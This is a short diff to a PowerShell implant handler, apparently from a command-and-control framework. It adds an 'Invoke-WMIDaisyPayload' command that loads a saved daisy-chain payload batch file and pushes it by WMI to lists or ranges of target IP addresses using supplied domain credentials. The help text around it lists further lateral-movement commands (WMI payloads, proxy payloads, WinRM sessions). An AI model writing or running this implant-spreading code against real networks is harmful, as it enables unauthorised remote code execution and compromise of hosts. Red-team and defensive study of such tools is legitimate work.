@@ -185,6 +185,7 @@ function Implant-Handler
         Write-Host " Invoke-RunAsProxyPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
         write-host " Invoke-WMICommand -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>' -command <cmd>" -ForegroundColor Green
         write-host " Invoke-WMIPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
+        write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
@@ -735,6 +736,18 @@ param
                     $pscommand = 'fvdsghfdsyyh'
                 }
             }
+            if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
+            {
+                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
+                    CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
+                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMICommand'
+                    $pscommand = $pscommand + " -command '$proxypayload'"
+                } else {
+                    write-host "Need to run Invoke-DaisyChain first"
+                    $pscommand = 'fvdsghfdsyyh'
+                }
+            }            
             if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
             {
                 if (Test-Path "$FolderPath\payloads\payload.bat"){ 
